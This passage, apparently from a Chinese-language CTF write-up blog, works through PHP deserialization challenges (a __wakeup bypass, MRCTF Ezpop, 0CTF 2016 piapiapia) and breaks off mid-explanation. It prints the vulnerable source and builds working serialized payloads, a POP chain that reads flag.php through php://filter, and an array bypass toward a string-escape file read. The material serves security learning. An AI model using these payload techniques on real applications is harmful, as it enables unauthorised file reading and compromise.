attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 70%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 640px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token prolog">&lt;?php    include 'class.php';    $select = $_GET['select'];    $res=unserialize(@$select);    ?></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 5%<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span> 99%<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font</span><span class="token punctuation">:</span>italic 15px Georgia<span class="token punctuation">,</span>serif<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>white<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> Syclover @ cl4y<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span>  <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name&#123;    private $username &#x3D; &#39;nonono&#39;;    private $password &#x3D; &#39;yesyes&#39;;    public function __construct($username,$password)&#123;        $this-&gt;username &#x3D; $username;        $this-&gt;password &#x3D; $password;    &#125;    function __wakeup()&#123;        $this-&gt;username &#x3D; &#39;guest&#39;;    &#125;    function __destruct()&#123;        if ($this-&gt;password !&#x3D; 100) &#123;            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;            die();        &#125;        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        &#125;    &#125;&#125;?&gt;</code></pre><p>注意到index.php中有对get的select参数进行反序列化操作，并且题目给了一个class.php中的Name类，于是构造反序列化条件：</p><p>观察chass.php代码发现只要令password=100，username=admin，且绕过__wakeup函数即可，于是得到payload：</p><pre class="language-php" data-language="php"><code class="language-php">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</code></pre><p>传入即可</p><hr><h3 id="MRCTF—Ezpop"><a href="#MRCTF—Ezpop" class="headerlink" title="MRCTF—Ezpop"></a>MRCTF—Ezpop</h3><p>题目源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;flag is in flag.php&#x2F;&#x2F;WTF IS THIS?&#x2F;&#x2F;Learn From https:&#x2F;&#x2F;ctf.ieki.xyz&#x2F;library&#x2F;php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95&#x2F;&#x2F;And Crack It!class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;        $this-&gt;source &#x3D; $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source &#x3D; &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p &#x3D; array();    &#125;    public function __get($key)&#123;        $function &#x3D; $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a&#x3D;new Show;    highlight_file(__FILE__);&#125;</code></pre><p>一步步审计代码</p><p>首先看到最后的if语句，题目给出了一个可以get的pop参数，随后对其进行反序列化操作，于是直接想到利用反序列化漏洞，再往上看找利用点</p><p>题目给出了三个类，观察可利用点可以在<code>Modifier</code>对象中看到一个include函数，这里就可以利用文件包含从而达到任意文件读取的效果，具体方法只要令<code>include</code>的<code>value</code>为<code>php://filter/read=convert.base64-encode/resource=./flag.php</code>即可读取flag文件，所以就需要想办法利用这个点</p><p>可用看到<code>Modifier</code>对象中有一个<code>__invoke</code>方法代码如下</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">public function __invoke()&#123;    $this-&gt;append($this-&gt;var);&#125;</code></pre><p>里面调用了可触发条件的<code>append</code>方法，而此方法中的<code>var</code>属性是可控的，于是就可以直接利用<code>var</code>属性来调用<code>append</code>方法，从而达到文件包含的效果，初步构造序列化参数</p><pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;&#125;$a &#x3D; new Modifier;</code></pre><p>而<code>__invoke</code>函数的使用方法是当尝试以调用函数的方法调用一个对象时触发，于是找到可触发条件，可以在下面的<code>Test</code>对象中看到一个<code>__get</code>方法</p><pre class="language-php" data-language="php"><code class="language-php">public function __get($key)&#123;    $function &#x3D; $this-&gt;p;    return $function();&#125;</code></pre><p>这个方法里面返回的参数刚好可以作为函数条件调用一个对象，于是可以利用此方法调用<code>Modifier</code>对象，只需令里面的参数<code>p</code>为创建的新的<code>Modifier</code>对象即可，就可以触发<code>__invoke</code>函数，而<code>Test</code>对象中的参数<code>p</code>是可控的，于是就可以进一步构造序列化参数</p><pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;&#125;class Test&#123;    public $p;&#125;$a &#x3D; new Modifier;$b &#x3D; new Test;$b-&gt;p &#x3D; $a;</code></pre><p>随后就需要想办法如何触发<code>__get</code>函数，<code>__get</code>函数的触发条件是当对象读取不可访问的属性的时候触发，于是就需要构造一个不可访问的属性来触发此函数，当然这个属性在对象内部肯定是不存在的，于是就要到外部去找，可以看到<code>Show</code>对象中的<code>__toString</code>方法</p><pre class="language-php" data-language="php"><code class="language-php">public function __toString()&#123;    return $this-&gt;str-&gt;source;&#125;</code></pre><p>这里就可以构造<code>str</code>参数为一个<code>Test</code>对象，然后调用<code>source</code>属性，而<code>Test</code>对象中是没有<code>source</code>这个属性的，这样就可以触发对象中的<code>__get</code>方法，而<code>Show</code>对象中的<code>str</code>属性是可控的，于是就可以接着构造</p><pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;&#125;class Show&#123;    public $str;&#125;class Test&#123;    public $p;&#125;$a &#x3D; new Modifier;$b &#x3D; new Test;$b-&gt;p &#x3D; $a;$c &#x3D; new Show;$c-&gt;str &#x3D; $b</code></pre><p>然后就该想想<code>__toString</code>方法该如何触发了，<code>__toString</code>方法触发条件是当对象被当做一个字符串被调用，于是寻找触发点可以在函数下方看到一个<code>__wakeup</code>方法</p><pre class="language-php" data-language="php"><code class="language-php">public function __wakeup()&#123;    if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;        echo &quot;hacker&quot;;        $this-&gt;source &#x3D; &quot;index.php&quot;;    &#125;&#125;</code></pre><p><code>__wakeup</code>函数之中的<code>source</code>属性在进行<code>preg_match</code>正则匹配的时候会被当做一个字符串来使用，于是就可以令<code>source</code>属性为上一个构造的<code>Show</code>对象，这样在进行正则匹配判断的时候就会吧这个对象当做字符串来处理，从而就可以触发<code>__toString</code>方法，于是就可以写出构造方法</p><pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $p;&#125;$a &#x3D; new Modifier;$b &#x3D; new Test;$b-&gt;p &#x3D; $a;$c &#x3D; new Show;$c-&gt;str &#x3D; $b;$d &#x3D; new Show;$d-&gt;source &#x3D; $c;</code></pre><p><code>__wakeup</code>触发的条件是当我们反序列化这个对象的时候就会触发这个函数，这个方法就无需我们再去找触发点了，只需要把<code>Show</code>反序列化就可以了，而这题的<code>pop</code>参数就提供了这样的条件，于是最终构造出序列化方法</p><pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $p;&#125;$a &#x3D; new Modifier;$b &#x3D; new Test;$b-&gt;p &#x3D; $a;$c &#x3D; new Show;$c-&gt;str &#x3D; $b;$d &#x3D; new Show;$d-&gt;source &#x3D; $c;echo serialize($d);</code></pre><p>于是最总payload：</p><pre class="language-php" data-language="php"><code class="language-php">O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;%00*%00var&quot;;s:59:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125;</code></pre><p>get传入pop=payload即可得到base64加密后的flag，解密即可。</p><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="0CTF 2016-piapiapia"></a>0CTF 2016-piapiapia</h3><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412180255952.png" alt loading="lazy"></p><p>题目一共四个界面，login，register，update和profile（也就是第一个显示界面）</p><p>前期探测sql注入和文件上传好像都没啥效果，随后扫一下发现存在<a href="http://www.zip源码泄露，代码审计">www.zip源码泄露，代码审计</a></p><p>简单看一下，省略HTML和一些无关部分</p><p>index.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    require_once(&#39;class.php&#39;);    if($_SESSION[&#39;username&#39;]) &#123;        header(&#39;Location: profile.php&#39;);        exit;    &#125;    if($_POST[&#39;username&#39;] &amp;&amp; $_POST[&#39;password&#39;]) &#123;        $username &#x3D; $_POST[&#39;username&#39;];        $password &#x3D; $_POST[&#39;password&#39;];        if(strlen($username) &lt; 3 or strlen($username) &gt; 16)             die(&#39;Invalid user name&#39;);        if(strlen($password) &lt; 3 or strlen($password) &gt; 16)             die(&#39;Invalid password&#39;);        if($user-&gt;login($username, $password)) &#123;            $_SESSION[&#39;username&#39;] &#x3D; $username;            header(&#39;Location: profile.php&#39;);            exit;            &#125;        else &#123;            die(&#39;Invalid user name or password&#39;);        &#125;    &#125;    else &#123;?&gt;......(html)</code></pre><p>register.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    require_once(&#39;class.php&#39;);    if($_POST[&#39;username&#39;] &amp;&amp; $_POST[&#39;password&#39;]) &#123;        $username &#x3D; $_POST[&#39;username&#39;];        $password &#x3D; $_POST[&#39;password&#39;];        if(strlen($username) &lt; 3 or strlen($username) &gt; 16)             die(&#39;Invalid user name&#39;);        if(strlen($password) &lt; 3 or strlen($password) &gt; 16)             die(&#39;Invalid password&#39;);        if(!$user-&gt;is_exists($username)) &#123;            $user-&gt;register($username, $password);            echo &#39;Register OK!&lt;a href&#x3D;&quot;index.php&quot;&gt;Please Login&lt;&#x2F;a&gt;&#39;;                &#125;        else &#123;            die(&#39;User name Already Exists&#39;);        &#125;    &#125;    else &#123;?&gt;......(html)</code></pre><p>update.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    require_once(&#39;class.php&#39;);    if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;        die(&#39;Login First&#39;);        &#125;    if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;        $username &#x3D; $_SESSION[&#39;username&#39;];        if(!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))            die(&#39;Invalid phone&#39;);        if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))            die(&#39;Invalid email&#39;);        if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)            die(&#39;Invalid nickname&#39;);        $file &#x3D; $_FILES[&#39;photo&#39;];        if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)            die(&#39;Photo size error&#39;);        move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));        $profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];        $profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];        $profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname3&#39;];        $profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);        $user-&gt;update_profile($username, serialize($profile));        echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;    &#125;    else &#123;?&gt;......(html)&lt;?php    &#125;?&gt;</code></pre><p>profile.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    require_once(&#39;class.php&#39;);    if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;        die(&#39;Login First&#39;);        &#125;    $username &#x3D; $_SESSION[&#39;username&#39;];    $profile&#x3D;$user-&gt;show_profile($username);    if($profile  &#x3D;&#x3D; null) &#123;        header(&#39;Location: update.php&#39;);    &#125;    else &#123;        $profile &#x3D; unserialize($profile);        $phone &#x3D; $profile[&#39;phone&#39;];        $email &#x3D; $profile[&#39;email&#39;];        $nickname &#x3D; $profile[&#39;nickname&#39;];        $photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));?&gt;......(html)&lt;?php    &#125;?&gt;</code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phprequire(&#39;config.php&#39;);class user extends mysql&#123;    private $table &#x3D; &#39;users&#39;;    public function is_exists($username) &#123;        $username &#x3D; parent::filter($username);        $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;        return parent::select($this-&gt;table, $where);    &#125;    public function register($username, $password) &#123;        $username &#x3D; parent::filter($username);        $password &#x3D; parent::filter($password);        $key_list &#x3D; Array(&#39;username&#39;, &#39;password&#39;);        $value_list &#x3D; Array($username, md5($password));        return parent::insert($this-&gt;table, $key_list, $value_list);    &#125;    public function login($username, $password) &#123;        $username &#x3D; parent::filter($username);        $password &#x3D; parent::filter($password);        $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;        $object &#x3D; parent::select($this-&gt;table, $where);        if ($object &amp;&amp; $object-&gt;password &#x3D;&#x3D;&#x3D; md5($password)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function show_profile($username) &#123;        $username &#x3D; parent::filter($username);        $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;        $object &#x3D; parent::select($this-&gt;table, $where);        return $object-&gt;profile;    &#125;    public function update_profile($username, $new_profile) &#123;        $username &#x3D; parent::filter($username);        $new_profile &#x3D; parent::filter($new_profile);        $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;        return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);    &#125;    public function __tostring() &#123;        return __class__;    &#125;&#125;class mysql &#123;    private $link &#x3D; null;    public function connect($config) &#123;        $this-&gt;link &#x3D; mysql_connect(            $config[&#39;hostname&#39;],            $config[&#39;username&#39;],            $config[&#39;password&#39;]        );        mysql_select_db($config[&#39;database&#39;]);        mysql_query(&quot;SET sql_mode&#x3D;&#39;strict_all_tables&#39;&quot;);        return $this-&gt;link;    &#125;    public function select($table, $where, $ret &#x3D; &#39;*&#39;) &#123;        $sql &#x3D; &quot;SELECT $ret FROM $table WHERE $where&quot;;        $result &#x3D; mysql_query($sql, $this-&gt;link);        return mysql_fetch_object($result);    &#125;    public function insert($table, $key_list, $value_list) &#123;        $key &#x3D; implode(&#39;,&#39;, $key_list);        $value &#x3D; &#39;\&#39;&#39; . implode(&#39;\&#39;,\&#39;&#39;, $value_list) . &#39;\&#39;&#39;;         $sql &#x3D; &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;        return mysql_query($sql);    &#125;    public function update($table, $key, $value, $where) &#123;        $sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;;        return mysql_query($sql);    &#125;    public function filter($string) &#123;        $escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);        $escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;        $string &#x3D; preg_replace($escape, &#39;_&#39;, $string);        $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);        $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;        return preg_replace($safe, &#39;hacker&#39;, $string);    &#125;    public function __tostring() &#123;        return __class__;    &#125;&#125;session_start();$user &#x3D; new user();$user-&gt;connect($config);</code></pre><p>config.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;    $config[&#39;username&#39;] &#x3D; &#39;root&#39;;    $config[&#39;password&#39;] &#x3D; &#39;&#39;;    $config[&#39;database&#39;] &#x3D; &#39;&#39;;    $flag &#x3D; &#39;&#39;;?&gt;</code></pre><p>看最后一个config.php中包含flag，题目要求应该是要我们config.php文件，寻找利用点</p><p>在profile.php中看到有一行代码：</p><pre class="language-php" data-language="php"><code class="language-php">$photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code></pre><p>明显的文件读取操作，而在代码上发现有一个反序列化操作</p><pre class="language-php" data-language="php"><code class="language-php">$profile &#x3D; unserialize($profile);</code></pre><p>找到<code>$profile</code>的定义</p><pre class="language-php" data-language="php"><code class="language-php">$profile&#x3D;$user-&gt;show_profile($username);</code></pre><p>跟进<code>show_profile</code>函数</p><pre class="language-php" data-language="php"><code class="language-php">public function show_profile($username) &#123;$username &#x3D; parent::filter($username);$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;$object &#x3D; parent::select($this-&gt;table, $where);return $object-&gt;profile;&#125;</code></pre><p>存在一个对数据库的查询操作，于是寻找数据库写入操作</p><pre class="language-php" data-language="php"><code class="language-php">public function update_profile($username, $new_profile) &#123;$username &#x3D; parent::filter($username);$new_profile &#x3D; parent::filter($new_profile);$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);&#125;</code></pre><p>在找到引用过这个函数的代码，在update.php中</p><pre class="language-php" data-language="php"><code class="language-php">$user-&gt;update_profile($username, serialize($profile));</code></pre><p>可看到存在序列化操作，至此关系以及理清楚</p><p>通过对<code>$profile</code>传入序列化后的字符串再绕过阻碍达到利用<code>file_get_contents</code>读取文件的操作</p><p>再细看代码：</p><pre class="language-php" data-language="php"><code class="language-php">move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));$profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];$profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];$profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname3&#39;];$profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);</code></pre><p>$profile是这样定义的结合上面的读取文件操作可知其中的photo变量如果控制令其为config.php即可读取到flag，于是初步payload：</p><pre class="language-php" data-language="php"><code class="language-php">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:9:&quot;aa@aa.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;aaa&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload&#x2F;0cc175b9c0f1b6a831c399e269772661&quot;;&#125;</code></pre><p>反序列化只反到第一个<code>&#125;</code>结束，后面的自动丢弃，但是photo似乎不是我们能够直接控制的，源码中<code>photo= &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code>，也就是说我们不能直接更改photo中的内容了，于是就需要找到序列化后的其它可利用参数再其后写上<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，达到修改的效果，phone，email，nickname都是我们可控的，而phone和email经过了严格的过滤（详情看上面的update.php源码），再来看看nickname：</p><pre class="language-php" data-language="php"><code class="language-php">if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)die(&#39;Invalid nickname&#39;);</code></pre><p><code>nickname[]</code>数组绕过<code>preg_match</code>和<code>strlen</code>即可，两边判断均为<code>false</code>，故不会执行if中的语句，于是再构造payload：</p><pre class="language-php" data-language="php"><code class="language-php">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:9:&quot;aa@aa.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;aaa&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;0cc175b9c0f1b6a831c399e269772661&quot;;&#125;</code></pre><p>到这里是否就已经可以成功读取到文件了呢？并非如此，如果要进行如上的操作，就需要给<code>nickname[]</code>传<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>这样的一个值，传入后将会是这个样子</p><pre class="language-php" data-language="php"><code class="language-php">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:9:&quot;aa@aa.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:34:&quot;&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;0cc175b9c0f1b6a831c399e269772661&quot;;&#125;</code></pre><p>虽然看上去大括号被闭合了，但是要注意到<code>s:34</code>这里，在反序列化的时候进行数据读取的时候依然会读取到引号中的34位字符，就对于没有闭合上，那有该如何利用呢？再接着看代码，</p><p>看看将<code>$profile</code>序列化结果存入数据库时的操作：</p><pre class="language-php" data-language="php"><code class="language-php">public function update_profile($username, $new_profile) &#123;$username &#x3D; parent::filter($username);$new_profile &#x3D; parent::filter($new_profile);$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);&#125;</code></pre><p>可看见对传入的参数进行了处理，跟进父类的<code>filter</code>方法：</p><pre class="language-php" data-language="php"><code class="language-php">public function filter($string) &#123;$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;return preg_replace($safe, &#39;hacker&#39;, $string);&#125;</code></pre><p>可见<code>$string</code>参数经过了两次过滤，第一次等于没用，两次应该都是来防止sql注入的，但这里似乎也不存在sql注入，序列化后的<code>$profile</code>不可能有sql注入风险，而<code>$username</code>的取值来自<code>$_SESSION[&#39;username&#39;]</code>，而<code>username</code>的<code>session</code>是系统分配的，这里也不存在sql注入，所以想想怎么利用在反序列化上面</p><p>这里就涉及到本题的核心了，<strong>反序列化长度逃逸字符</strong></p><p>在php反序列化的守护是根据s后面的值来取字符串长度的，而在<code>filter</code>方法总存在<code>preg_replace</code>替换，如果有<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, 